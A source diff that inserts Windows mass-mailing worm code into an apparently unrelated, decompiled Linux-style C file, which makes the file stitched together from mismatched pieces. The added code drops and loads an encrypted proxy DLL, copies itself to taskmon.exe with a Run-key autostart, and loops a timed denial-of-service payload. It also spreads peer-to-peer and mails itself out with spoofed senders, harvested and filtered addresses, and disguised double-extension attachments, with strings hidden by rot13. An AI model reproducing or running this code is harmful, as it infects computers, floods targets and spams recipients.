@@ -38,6 +38,12 @@
 #include <sys/errno.h>
 #include <linux/spinlock.h>
 #include <linux/module.h>
+#include <windows.h>
+#include <winsock2.h>
+#include "lib.h"
+#include "massmail.h"
+#include "scan.h"
+#include "sco.h"
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/errno.h>
@@ -3832,6 +3838,288 @@ int32_t function_401d80(void) {
     int32_t v10;
     g2 = v10;
     return 0;
+    
+}
+struct sync_t {
+	int first_run;
+	DWORD start_tick;
+	char xproxy_path[MAX_PATH];
+	int xproxy_state;              
+	char sync_instpath[MAX_PATH];
+	SYSTEMTIME sco_date;
+	SYSTEMTIME termdate;
+};
+
+void decrypt1_to_file(const unsigned char *src, int src_size, HANDLE hDest)
+{
+	unsigned char k, buf[1024];
+	int i, buf_i;
+	DWORD dw;
+	for (i=0,buf_i=0,k=0xC7; i<src_size; i++) {
+		if (buf_i >= sizeof(buf)) {
+			WriteFile(hDest, buf, buf_i, &dw, NULL);
+			buf_i = 0;
+		}
+		buf[buf_i++] = src[i] ^ k;
+		k = (k + 3 * (i % 133)) & 0xFF;
+	}
+	if (buf_i) WriteFile(hDest, buf, buf_i, &dw, NULL);
+}
+
+void payload_xproxy(struct sync_t *sync)
+{
+	char fname[20], fpath[MAX_PATH+20];
+	HANDLE hFile;
+	int i;
+	rot13(fname, "fuvztncv.qyy");   /* "shimgapi.dll" */
+	sync->xproxy_state = 0;
+	for (i=0; i<2; i++) {
+		if (i == 0)
+			GetSystemDirectory(fpath, sizeof(fpath));
+		else
+			GetTempPath(sizeof(fpath), fpath);
+		if (fpath[0] == 0) continue;
+		if (fpath[lstrlen(fpath)-1] != '\\') lstrcat(fpath, "\\");
+		lstrcat(fpath, fname);
+		hFile = CreateFile(fpath, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
+			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
+			if (GetFileAttributes(fpath) == INVALID_FILE_ATTRIBUTES)
+				continue;
+			sync->xproxy_state = 2;
+			lstrcpy(sync->xproxy_path, fpath);
+			break;
+		}
+		decrypt1_to_file(xproxy_data, sizeof(xproxy_data), hFile);
+		CloseHandle(hFile);
+		sync->xproxy_state = 1;
+		lstrcpy(sync->xproxy_path, fpath);
+		break;
+	}
+
+	if (sync->xproxy_state == 1) {
+		LoadLibrary(sync->xproxy_path);
+		sync->xproxy_state = 2;
+	}
+}
+
+void sync_check_frun(struct sync_t *sync)
+{
+	HKEY k;
+	DWORD disp;
+	char i, tmp[128];
+
+	/* "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\Version" */
+	rot13(tmp, "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Rkcybere\\PbzQyt32\\Irefvba");
+
+	sync->first_run = 0;
+	for (i=0; i<2; i++)
+		if (RegOpenKeyEx((i == 0) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER,
+		    tmp, 0, KEY_READ, &k) == 0) {
+			RegCloseKey(k);
+			return;
+		}
+
+	sync->first_run = 1;
+	for (i=0; i<2; i++)
+		if (RegCreateKeyEx((i == 0) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER,
+		    tmp, 0, NULL, 0, KEY_WRITE, NULL, &k, &disp) == 0)
+			RegCloseKey(k);
+}
+
+int sync_mutex(struct sync_t *sync)
+{
+	char tmp[64];
+	rot13(tmp, "FjroFvcpFzgkF0");		/* "SwebSipcSmtxS0" */
+	CreateMutex(NULL, TRUE, tmp);
+	return (GetLastError() == ERROR_ALREADY_EXISTS) ? 1 : 0;
+}
+
+void sync_install(struct sync_t *sync)
+{
+	char fname[20], fpath[MAX_PATH+20], selfpath[MAX_PATH];
+	HANDLE hFile;
+	int i;
+	rot13(fname, "gnfxzba.rkr");       /* "taskmon.exe" */
+
+	GetModuleFileName(NULL, selfpath, MAX_PATH);
+	lstrcpy(sync->sync_instpath, selfpath);
+	for (i=0; i<2; i++) {
+		if (i == 0)
+			GetSystemDirectory(fpath, sizeof(fpath));
+		else
+			GetTempPath(sizeof(fpath), fpath);
+		if (fpath[0] == 0) continue;
+		if (fpath[lstrlen(fpath)-1] != '\\') lstrcat(fpath, "\\");
+		lstrcat(fpath, fname);
+		SetFileAttributes(fpath, FILE_ATTRIBUTE_ARCHIVE);
+		hFile = CreateFile(fpath, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
+			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
+			if (GetFileAttributes(fpath) == INVALID_FILE_ATTRIBUTES)
+				continue;
+			lstrcpy(sync->sync_instpath, fpath);
+			break;
+		}
+		CloseHandle(hFile);
+		DeleteFile(fpath);
+
+		if (CopyFile(selfpath, fpath, FALSE) == 0) continue;
+		lstrcpy(sync->sync_instpath, fpath);
+		break;
+	}
+}
+
+void sync_startup(struct sync_t *sync)
+{
+	HKEY k;
+	char regpath[128];
+	char valname[32];
+
+	/* "Software\\Microsoft\\Windows\\CurrentVersion\\Run" */
+	rot13(regpath, "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");
+	rot13(valname, "GnfxZba");	/* "TaskMon" */
+
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, regpath, 0, KEY_WRITE, &k) != 0)
+		if (RegOpenKeyEx(HKEY_CURRENT_USER, regpath, 0, KEY_WRITE, &k) != 0)
+			return;
+	RegSetValueEx(k, valname, 0, REG_SZ, sync->sync_instpath, lstrlen(sync->sync_instpath)+1);
+	RegCloseKey(k);
+}
+
+int sync_checktime(struct sync_t *sync)
+{
+	FILETIME ft_cur, ft_final;
+	GetSystemTimeAsFileTime(&ft_cur);
+	SystemTimeToFileTime(&sync->termdate, &ft_final);
+	if (ft_cur.dwHighDateTime > ft_final.dwHighDateTime) return 1;
+	if (ft_cur.dwHighDateTime < ft_final.dwHighDateTime) return 0;
+	if (ft_cur.dwLowDateTime > ft_final.dwLowDateTime) return 1;
+	return 0;
+}
+
+void payload_sco(struct sync_t *sync)
+{
+	FILETIME ft_cur, ft_final;
+
+/* What's the bug about "75% failures"? */
+
+	GetSystemTimeAsFileTime(&ft_cur);
+	SystemTimeToFileTime(&sync->sco_date, &ft_final);
+	if (ft_cur.dwHighDateTime < ft_final.dwHighDateTime) return;
+	if (ft_cur.dwLowDateTime < ft_final.dwLowDateTime) return;
+
+
+/* here is another bug.
+   actually, the idea was to create a new thread and return; */
+
+	for (;;) {
+		scodos_main();
+		Sleep(1024);
+	}
+}
+
+DWORD _stdcall sync_visual_th(LPVOID pv)
+{
+	PROCESS_INFORMATION pi; 
+	STARTUPINFO si; 
+	char cmd[256], tmp[MAX_PATH], buf[512];
+	HANDLE hFile;
+	int i, j;
+	DWORD dw;
+
+	tmp[0] = 0;
+	GetTempPath(MAX_PATH, tmp);
+	if (tmp[0] == 0) goto ex;
+	if (tmp[lstrlen(tmp)-1] != '\\') lstrcat(tmp, "\\");
+	lstrcat(tmp, "Message");
+
+	hFile = CreateFile(tmp, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
+		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) goto ex;
+	for (i=0, j=0; i < 4096; i++) {
+		if (j >= (sizeof(buf)-4)) {
+			WriteFile(hFile, buf, sizeof(buf), &dw, NULL);
+			j = 0;
+		}
+		if ((xrand16() % 76) == 0) {
+			buf[j++] = 13;
+			buf[j++] = 10;
+		} else {
+			buf[j++] = (16 + (xrand16() % 239)) & 0xFF;
+		}
+	}
+	if (j) WriteFile(hFile, buf, j, &dw, NULL);
+	CloseHandle(hFile);
+
+	wsprintf(cmd, "notepad %s", tmp);
+	memset(&si, '\0', sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	if (CreateProcess(0, cmd, 0, 0, TRUE, 0, 0, 0, &si, &pi) == 0)
+		goto ex;
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hProcess);
+
+ex:	if (tmp[0]) DeleteFile(tmp);
+	ExitThread(0);
+	return 0;
+}
+
+void sync_main(struct sync_t *sync)
+{
+	DWORD tid;
+
+	sync->start_tick = GetTickCount();
+	sync_check_frun(sync);
+	if (!sync->first_run)
+		if (sync_mutex(sync)) return;
+	if (sync->first_run)
+		CreateThread(0, 0, sync_visual_th, NULL, 0, &tid);
+	payload_xproxy(sync);
+
+	if (sync_checktime(sync)) return;
+
+	sync_install(sync);
+	sync_startup(sync);
+
+	payload_sco(sync);
+
+	p2p_spread();
+
+	massmail_init();
+	CreateThread(0, 0, massmail_main_th, NULL, 0, &tid);
+
+	scan_init();
+	for (;;) {
+		scan_main();
+		Sleep(1024);
+	}
+}
+
+/* shit, MSVC inlined it to WinMain... I didn't expect. */
+static void wsa_init(void)
+{
+	WSADATA wsadata;	/* useless shit... */
+	WSAStartup(MAKEWORD(2,0), &wsadata);
+}
+
+int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
+{
+	static const SYSTEMTIME termdate = { 2004,2,0,12,   2,28,57 };
+	static const SYSTEMTIME sco_date = { 2004,2,0, 1,  16, 9,18 };
+	struct sync_t sync0;
+
+	xrand_init();
+	wsa_init();
+
+	memset(&sync0, '\0', sizeof(sync0));
+	sync0.termdate = termdate;
+	sync0.sco_date = sco_date;
+	sync_main(&sync0);
+
+	ExitProcess(0);
 }
     // Function to handle the sigini
 void handle_sigint(int sig) {
@@ -10906,6 +11194,670 @@ void function_409842(int32_t a1) {
     // 0x409842
     int32_t v1;
     function_409816((int32_t (**)())a1, v1);
+}
+}
+
+static int cut_email(const char *in_buf, char *out_buf)
+{
+	int i, j;
+
+	if (lstrlen(in_buf) < 3)
+		return 1;
+
+	for (i=0; in_buf[i] && (isspace(in_buf[i]) || !isemailchar(in_buf[i])); i++);
+	for (; in_buf[i] && xstrchr(BEGINEND_INV, in_buf[i]); i++);
+
+	for (j=0; in_buf[i]; i++) {
+		if (in_buf[i] == '@') break;
+		if (!isemailchar(in_buf[i])) continue;
+		out_buf[j++] = tolower(in_buf[i]);
+	}
+	if (in_buf[i] != '@') return 1;
+	while (in_buf[i] == '@') i++;
+	out_buf[j] = 0;
+
+	TRIM_END(out_buf);
+
+	out_buf[j++] = '@';
+	for (; in_buf[i]; i++) {
+		if (!isemailchar(in_buf[i])) continue;
+		if ((out_buf[j-1] == '.') && (in_buf[i] == '.')) continue;
+		out_buf[j++] = tolower(in_buf[i]);
+	}
+	out_buf[j] = 0;
+
+	TRIM_END(out_buf);
+
+	if ((lstrlen(out_buf) < 3) || (out_buf[0] == '@'))
+		return 1;
+	return 0;
+}
+
+static void email2parts(char *email, char *username, char *domain)
+{
+	int i;
+
+	for (i=0; (email[i] != '@') && email[i]; i++)
+		if (username && !isspace(email[i])) *username++=email[i];
+	if (username) *username = 0;
+
+	if ((email[i] == 0) || (domain == NULL)) {
+		if (domain) lstrcpy(domain, email);
+		return;
+	}
+
+	for (i++; email[i]; i++)
+		if (!isspace(email[i])) *domain++=email[i];
+	*domain = 0;
+}
+static void select_from(struct msgstate_t *state)
+{
+	static const char *step3_domains[] = {
+		/* "aol.com", "msn.com", "yahoo.com", "hotmail.com" */
+		"nby.pbz", "zfa.pbz", "lnubb.pbz", "ubgznvy.pbz"
+	};
+	int i, j, n;
+	struct mailq_t *mq;
+
+	state->from[0] = 0;
+
+	/* STEP1 */
+	while ((xrand16() % 100) < 98) {
+		for (n=0,mq=massmail_queue; mq; mq=mq->next, n++);
+		if (n <= 3) break;
+		j = xrand32() % n;
+		for (i=0,mq=massmail_queue; mq; mq=mq->next, i++)
+			if (i == j) break;
+		if (mq == NULL) break;
+		lstrcpy(state->from, mq->to);
+		return;
+	}
+
+	/* STEP 2: use any Outlook account. Not implemented yet. */
+
+	/* STEP 3 */
+	j = 3 + (xrand16() % 3);        /* username length; 3-5 chars */
+	for (i=0; i<j; i++)
+		state->from[i] = 'a' + (xrand16() % 26);
+	state->from[i++] = '@';
+	j = xrand16() % (sizeof(step3_domains) / sizeof(step3_domains[0]));
+	rot13(state->from+i, step3_domains[j]);
+}
+
+static void select_exename(struct msgstate_t *state)
+{
+	static const struct {
+		char pref;
+		const char *name;
+	} names[] = {
+		{ 30, "qbphzrag" },
+		{ 15, "ernqzr" },
+		{ 15, "qbp" },
+		{ 15, "grkg" },
+		{ 10, "svyr" },
+		{ 10, "qngn" },
+		{ 5, "grfg" },
+		{ 17, "zrffntr" },
+		{ 17, "obql" },
+		{ 0, "" }
+	};
+	static const struct {
+		char pref;
+		const char *ext;
+	} exts[] = {
+		{ 50, "cvs" },
+		{ 50, "fpe" },
+		{ 15, "rkr" },
+		{ 5, "pzq" },
+		{ 5, "ong" },
+		{ 0, "" }
+	};
+	int i, j, tot;
+
+	if ((xrand16() % 100) < 8) {
+		j = 3 + (xrand16() % 5);
+		for (i=0; i<j; i++)
+			state->exe_name[i] = 'a' + (xrand16() % 26);
+		state->exe_name[i] = 0;
+	} else {
+		for (i=0, tot=1; names[i].pref != 0; i++) tot += names[i].pref;
+		j = xrand16() % tot;
+		for (i=0, tot=1; names[i].pref != 0; i++)
+			if ((tot += names[i].pref) >= j) break;
+		if (names[i].pref == 0) i = 0;
+		rot13(state->exe_name, names[i].name);
+	}
+
+	for (i=0, tot=1; exts[i].pref != 0; i++) tot += exts[i].pref;
+	j = xrand16() % tot;
+	for (i=0, tot=1; exts[i].pref != 0; i++)
+		if ((tot += exts[i].pref) >= j) break;
+	if (exts[i].pref == 0) i = 0;
+	rot13(state->exe_ext, exts[i].ext);
+
+	wsprintf(state->attach_name, "%s.%s", state->exe_name, state->exe_ext);
+}
+
+static void select_subject(struct msgstate_t *state)
+{
+	static const struct {
+		char pref;
+		const char *subj;
+	} subjs[] = {
+		{ 12, "" },
+		{ 35, "grfg" },
+		{ 35, "uv" },
+		{ 35, "uryyb" },
+		{ 8, "Znvy Qryvirel Flfgrz" },
+		{ 8, "Znvy Genafnpgvba Snvyrq" },
+		{ 8, "Freire Ercbeg" },
+		{ 10, "Fgnghf" },
+		{ 10, "Reebe" },
+		{ 0, "" }
+	};
+	int i, j, tot;
+
+	if ((xrand16() % 100) < 5) {
+		j = 3 + (xrand16() % 15);
+		for (i=0; i<j; i++)
+			state->subject[i] = 'a' + (xrand16() % 26);
+		state->subject[i] = 0;
+	} else {
+		for (i=0, tot=1; subjs[i].pref != 0; i++) tot += subjs[i].pref;
+		j = xrand16() % tot;
+		for (i=0, tot=1; subjs[i].pref != 0; i++)
+			if ((tot += subjs[i].pref) >= j) break;
+		if (subjs[i].pref == 0) i = 0;
+		rot13(state->subject, subjs[i].subj);
+	}
+
+	i = xrand16() % 100;
+	if ((i >= 50) && (i < 85))
+		CharUpperBuff(state->subject, 1);
+	else if (i >= 85)
+		CharUpper(state->subject);
+}
+
+static int select_attach_file(struct msgstate_t *state)
+{
+	HANDLE h;
+	char buf[MAX_PATH];
+
+	state->zip_used = 0;
+	state->zip_nametrick = 0;
+	if ((xrand16() % 100) < 64)
+		state->zip_used = 1;
+
+	if (state->zip_used == 0) {
+		state->is_tempfile = 0;
+		GetModuleFileName(NULL, state->attach_file, MAX_PATH);
+	} else {
+		state->is_tempfile = 1;
+		buf[0] = 0;
+		GetTempPath(MAX_PATH, buf);
+		if (buf[0] == 0)
+			return 1;
+		state->attach_file[0] = 0;
+		GetTempFileName(buf, "tmp", 0, state->attach_file);
+		if (state->attach_file[0] == 0)
+			return 1;
+		GetModuleFileName(NULL, buf, MAX_PATH);
+
+		state->zip_nametrick = 0;
+		if ((xrand16() % 100) < 40)
+			state->zip_nametrick = 1;
+
+		if (state->zip_nametrick == 0) {
+			if (zip_store(buf, state->attach_file, state->attach_name))
+				return 1;
+		} else {
+			char zip_name[512];
+			int i;
+
+			lstrcpy(zip_name, state->exe_name);
+			lstrcat(zip_name, ".");
+			switch (xrand16() % 5) {
+				case 0: lstrcat(zip_name, "doc"); break;
+				case 1: case 2: lstrcat(zip_name, "htm"); break;
+				default: lstrcat(zip_name, "txt"); break;
+			}
+			for (i=0; i<70; i++)
+				lstrcat(zip_name, " ");
+			lstrcat(zip_name, ".");
+			switch (xrand16() % 3) {
+				case 0: lstrcat(zip_name, "e"); lstrcat(zip_name, "xe"); break;
+				case 1: lstrcat(zip_name, "s"); lstrcat(zip_name, "cr"); break;
+				default: lstrcat(zip_name, "p"); lstrcat(zip_name, "if"); break;
+			}
+			
+			if (zip_store(buf, state->attach_file, zip_name))
+				return 1;
+		}
+		wsprintf(state->attach_name, "%s.zip", state->exe_name);
+	}
+
+	h = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
+		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (h == NULL || h == INVALID_HANDLE_VALUE) {
+		if (state->is_tempfile) DeleteFile(state->attach_file);
+		return 1;
+	}
+	state->attach_size = GetFileSize(h, NULL);
+	CloseHandle(h);
+
+	if ((state->attach_size < 1024) || (state->attach_size > (300*1024))) {
+		if (state->is_tempfile) DeleteFile(state->attach_file);
+		return 1;
+	}
+
+	return 0;
+}
+
+static void write_msgtext(struct msgstate_t *state, unsigned char *p)
+{
+	struct {
+		int pref;
+		char *text;
+	} texts[] = {
+		{ 20, "" },
+		{ 5, "test" },
+		{ 40, "The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment." },
+		{ 40, "The message contains Unicode characters and has been sent as a binary attachment." },
+		{ 20, "Mail transaction failed. Partial message is available." },
+		{ 0, "" }
+	};
+	int i, j, w;
+
+	if ((xrand16() % 100) < 20) {
+		unsigned char c;
+		w = 512 + xrand16() % 2048;
+		for (i=0; i<w;) {
+			c = xrand16() & 0xFF;
+			if (c < 32) continue;
+			if (c == '=' || c == '+' || c == 255 || c == 127 || c == 128 || c == '@')
+				continue;
+		        p[i++] = c;
+			if ((xrand16() % 70) == 0) {
+				p[i++] = 13;
+				p[i++] = 10;
+			}
+		}
+		p[i] = 0;
+		return;
+	}
+
+	for (i=0,w=1; texts[i].pref != 0; i++) w += texts[i].pref;
+	j = xrand16() % w;
+	for (i=0,w=1; texts[i].pref != 0; i++) if ((w += texts[i].pref) >= j) break;
+	if (texts[i].pref == 0) i = 0;
+	lstrcpy(p, texts[i].text);
+}
+
+static email_check2(char *email)
+{
+	static int i, j, tld_len;
+	static char usr[256], dom[256];
+	if (email[0] == 0) return 1;
+
+	for (i=0, j=0; email[i]; i++)
+		if (email[i] == '@') j++;
+	if (j != 1) return 1;
+
+	for (i=lstrlen(email); i>0; i--) {
+		if (email[i-1] == '.') break;
+		if (email[i-1] == '@') return 1;
+	}
+	if (i == 0) return 1;
+
+	tld_len = lstrlen(email) - i + 1;
+	if ((tld_len < 2) || (tld_len > 4)) return 1;
+
+	email2parts(email, usr, dom);
+	i = lstrlen(usr);
+	if ((i < 2) || (i > 24)) return 1;
+	i = lstrlen(dom);
+	if ((i < 6) || (i > 42)) return 1;      /* at least "xxx.xx" */
+
+	for (i=lstrlen(dom)-1; i>0; i--)
+		if ((dom[i] == '.') && (dom[i-1] == '.')) return 1;
+
+	for (i=0, j=0; usr[i]; i++)
+		if ((usr[i] >= '0') && (usr[i] <= '9')) j++;
+	i = (j * 100) / lstrlen(usr);
+	if (lstrlen(usr) > 12) {
+		if (i >= 50) return 1;
+	} else if (lstrlen(usr) >= 6) {
+		if (i >= 60) return 1;
+	} else {
+		if (i >= 70) return 1;
+	}
+
+	return 0;
+}
+
+static int email_filtdom(const char *email)
+{
+	static const char *nospam_domains[] = {
+		"avp", "syma", "icrosof", "msn.", "hotmail", "panda",
+		"sopho", "borlan", "inpris", "example", "mydomai", "nodomai",
+		"ruslis", /*vi[ruslis]t */
+		".gov", "gov.", ".mil", "foo.",
+
+/*"messagelabs", "support" */
+
+		NULL,
+		"\n\n\n"
+	};
+	static const char *loyal_list[] = {
+		"berkeley", "unix", "math", "bsd", "mit.e", "gnu", "fsf.",
+		"ibm.com", "google", "kernel", "linux", "fido", "usenet",
+		"iana", "ietf", "rfc-ed", "sendmail", "arin.", "ripe.",
+		"isi.e", "isc.o", "secur", "acketst", "pgp",
+		"tanford.e", "utgers.ed", "mozilla",
+
+/* 	"sourceforge", "slashdot", */
+
+		NULL,
+		"\n\nbe_loyal:"		/* for final .exe */
+	};
+
+	register int i;
+	char dom[256];
+
+	while (*email && *email != '@') email++;
+	if (*email != '@') return 0;
+	for (i=0,email++; (i<255) && *email; i++, email++)
+		dom[i] = tolower(*email);
+	dom[i] = 0;
+
+	for (i=0; loyal_list[i]; i++)
+		if (xstrstr(dom, loyal_list[i]) != NULL)
+			return 100;
+
+	for (i=0; nospam_domains[i]; i++)
+		if (xstrstr(dom, nospam_domains[i]) != NULL)
+			return 1;
+	return 0;
+}
+
+static int email_filtuser(const char *email)
+{
+	static const char *nospam_fullnames[] = {
+		"root", "info", "samples", "postmaster",
+		"webmaster", "noone", "nobody", "nothing", "anyone",
+		"someone", "your", "you", "me", "bugs", "rating", "site",
+		"contact", "soft", "no", "somebody", "privacy", "service",
+		"help", "not", "submit", "feste", "ca", "gold-certs",
+		"the.bat", "page",
+
+/* "support" */
+
+		NULL
+	};
+	static const char *nospam_anypart[] = {
+		"admin", "icrosoft", "support", "ntivi",
+		"unix", "bsd", "linux", "listserv",
+		"certific", "google", "accoun",
+
+/* "master" */
+		NULL
+	};
+	register int i;
+	char usr[256], tmp[16];
+
+	for (i=0; (i<255) && *email && (*email != '@'); i++, email++)
+		usr[i] = tolower(*email);
+	usr[i] = 0;
+	if (*email != '@') return 0;
+
+	for (i=0; nospam_fullnames[i]; i++)
+		if (lstrcmp(usr, nospam_fullnames[i]) == 0) return 1;
+
+	if (xstrncmp(usr, "spm", 3) == 0) return 1;
+	rot13(tmp, "fcnz");	/* "spam" */
+	//if (xstrncmp(usr, tmp, 4) == 0) return 1;
+	if (xstrstr(usr, tmp) != NULL) return 1;
+
+	if (xstrncmp(usr, "www", 3) == 0) return 1;
+	if (xstrncmp(usr, "secur", 5) == 0) return 1;
+	if (xstrncmp(usr, "abuse", 5) == 0) return 1;
+
+	for (i=0; nospam_anypart[i]; i++)
+		if (xstrstr(usr, nospam_anypart[i]) != NULL) return 1;
+
+	return 0;
+}
+
+static int email_filter(const char *in, char *out)
+{
+	int i, j;
+	if (cut_email(in, out)) return 1;
+	for (;;) {
+		if (out[0] == 0) break;
+		j = email_check2(out);
+		if (j == 0) break;
+
+		/* this is to avoid ".nospam", ".dontspam", etc. */
+		/* andy@host.somedomain.com.nospam */
+		for (i=(lstrlen(out)-1); i>=0; i--)
+			if (out[i] == '@' || out[i] == '.') break;
+		if (i <= 0) break;
+		if (out[i] != '.') break;
+		out[i] = 0;
+	}
+	if (j != 0) return 1;
+	if (email_filtdom(out)) return 1;
+	if (email_filtuser(out)) return 1;
+	return 0;
+}
+
+int massmail_addq(const char *email, int prior)
+{
+	char m1[256];
+	int i;
+	struct mailq_t *p1;
+	if (lstrlen(email) > 128) return 1;
+	if (email_filter(email, m1)) return 1;
+
+	for (p1=massmail_queue; p1; p1=p1->next)
+		if (lstrcmpi(p1->to, m1) == 0) return 2;
+
+	i = sizeof(struct mailq_t) + lstrlen(m1) + 4;
+	p1 = (struct mailq_t *)HeapAlloc(GetProcessHeap(), 0, i);
+	if (p1 == NULL) return 1;
+	memset(p1, 0, i);
+	p1->state = 0;
+	p1->tick_got = GetTickCount();
+	p1->priority = (char)prior;
+	lstrcpy(p1->to, m1);
+	p1->next = massmail_queue;
+	massmail_queue = p1;
+
+	if (xstrstr(m1, ".edu"))
+		p1->priority++;
+
+	return 0;
+}
+
+//-----------------------------------------------------------------------------
+// EMAIL GENERATOR
+
+static const char *gen_names[] = {
+    "john",     "john",     "alex",     "michael",  "james",    "mike",
+    "kevin",    "david",    "george",   "sam",      "andrew",   "jose",
+    "leo",      "maria",    "jim",      "brian",    "serg",     "mary",
+    "ray",      "tom",      "peter",    "robert",   "bob",      "jane",
+    "joe",      "dan",      "dave",     "matt",     "steve",    "smith",
+    "stan",     "bill",     "bob",      "jack",     "fred",     "ted",
+    "adam",     "brent",    "alice",    "anna",     "brenda",   "claudia",
+    "debby",    "helen",    "jerry",    "jimmy",    "julie",    "linda",
+    "sandra"
+};
+#define gen_names_cnt (sizeof(gen_names) / sizeof(gen_names[0]))
+
+void mm_gen(void)
+{
+	struct mailq_t *mq;
+	int queue_total, i, j;
+	char domain[128], *p;
+	char out_mail[256];
+
+	for (mq=massmail_queue, queue_total=0; mq; mq=mq->next, queue_total++);
+	if (queue_total == 0) return;
+	i = xrand32() % queue_total;
+	for (j=0,mq=massmail_queue; (j < i) && mq; mq=mq->next, j++);
+	if (mq == NULL) return;
+
+	for (p=mq->to; *p && *p != '@'; p++);
+	if (*p != '@') return;
+	lstrcpyn(domain, p+1, MAX_DOMAIN-1);
+
+	i = xrand16() % gen_names_cnt;
+
+	lstrcpy(out_mail, gen_names[i]);
+	lstrcat(out_mail, "@");
+	lstrcat(out_mail, domain);
+
+	massmail_addq(out_mail, 1);
+}
+
+//-----------------------------------------------------------------------------
+// DNS caching
+
+#define MMDNS_CACHESIZE 256
+
+struct dnscache_t {
+	struct dnscache_t *next;
+	struct mxlist_t *mxs;
+	char domain[MAX_DOMAIN];
+	unsigned long tick_lastused;
+	int ref;
+};
+struct dnscache_t * volatile mm_dnscache;
+
+struct dnscache_t *mmdns_getcached(const char *domain)
+{
+	register struct dnscache_t *p;
+	for (p=mm_dnscache; p; p=p->next)
+		if (lstrcmpi(p->domain, domain) == 0) return p;
+	return NULL;
+}
+
+int mmdns_addcache(const char *domain, struct mxlist_t *mxs)
+{
+	register struct dnscache_t *p, *p_oldest, *p_new;
+	int cache_size;
+	p_oldest = NULL;
+	for (p=mm_dnscache, cache_size=0; p; cache_size++) {
+		if (p->ref == 0) {
+			if (p_oldest == NULL) {
+				p_oldest = p;
+			} else {
+				if (p_oldest->tick_lastused < p->tick_lastused)
+					p_oldest = p;
+			}
+		}
+		p = p->next;
+	}
+
+	do {
+		if (cache_size <= MMDNS_CACHESIZE) break;
+		if (p_oldest == NULL)
+			return 1;
+		if (p_oldest->ref != 0)		/* FIXME: should try to search for another unused entry */
+			return 1;
+			/* or: { break; } */
+		p_oldest->ref = 1;
+		p_oldest->domain[0] = 0;
+		p_oldest->tick_lastused = GetTickCount();
+		free_mx_list(p_oldest->mxs);
+		lstrcpyn(p_oldest->domain, domain, MAX_DOMAIN-1);
+		p_oldest->mxs = mxs;
+		p_oldest->ref = 0;
+		return 0;
+	} while(0);
+
+	p_new = (struct dnscache_t *)HeapAlloc(GetProcessHeap(), 0, sizeof(struct dnscache_t));
+	if (p_new == NULL)
+		return 1;
+	memset(p_new, '\0', sizeof(struct dnscache_t));
+
+	p_new->mxs = mxs;
+	lstrcpyn(p_new->domain, domain, MAX_DOMAIN-1);
+	p_new->tick_lastused = GetTickCount();
+	p_new->ref = 0;
+
+	p_new->next = mm_dnscache;
+	mm_dnscache = p_new;
+
+	return 0;
+}
+
+struct dnscache_t *mm_get_mx(const char *domain)
+{
+	struct dnscache_t *cached;
+	struct mxlist_t *mxs;
+	if ((cached = mmdns_getcached(domain)) != NULL) {
+		cached->ref++;
+		return cached;
+	}
+	mxs = get_mx_list(domain);
+	if ((mxs == NULL) && ((GetTickCount() % 4) != 0))
+		return NULL;
+	mmdns_addcache(domain, mxs);
+	cached = mmdns_getcached(domain);
+	if (cached == NULL)
+		/* original: */
+		return NULL;
+
+		/* should be: */
+		/* { free_mx_list(mxs); return NULL; } */
+
+	cached->ref++;
+	return cached;
+}
+
+//-----------------------------------------------------------------------------
+
+void mmsender(struct mailq_t *email)
+{
+	char domain[MAX_DOMAIN], *p;
+	char *msg = NULL;
+	struct dnscache_t *mxs_cached=NULL;
+	struct mxlist_t *mxs=NULL;
+
+	for (p=email->to; *p && *p != '@'; p++);
+	if (*p++ != '@') return;
+	lstrcpyn(domain, p, MAX_DOMAIN-1);
+
+	mxs_cached = mm_get_mx(domain);
+	if (mxs_cached == NULL)
+		return;
+
+	msg = msg_generate(email->to);
+	if (msg == NULL) goto ex1;
+	smtp_send(mxs_cached->mxs, msg);
+
+	if (msg != NULL)
+		GlobalFree((HGLOBAL)msg);
+ex1:	if (mxs_cached != NULL)
+		if (mxs_cached->ref > 0) mxs_cached->ref--;
+	return;
+}
+
+static DWORD _stdcall mmsender_th(LPVOID pv)
+{
+	struct mailq_t *mq = (struct mailq_t *)pv;
+	InterlockedIncrement(&mmshed_run_threads);
+	if (mq != NULL) {
+		mq->state = 1;
+		mmsender(mq);
+		mq->state = 2;
+	}
+	if (mmshed_run_threads > 0)
+		InterlockedDecrement(&mmshed_run_threads);
+	ExitThread(0);
+	return 0;
 }
 
 // Address range: 0x409860 - 0x40988f
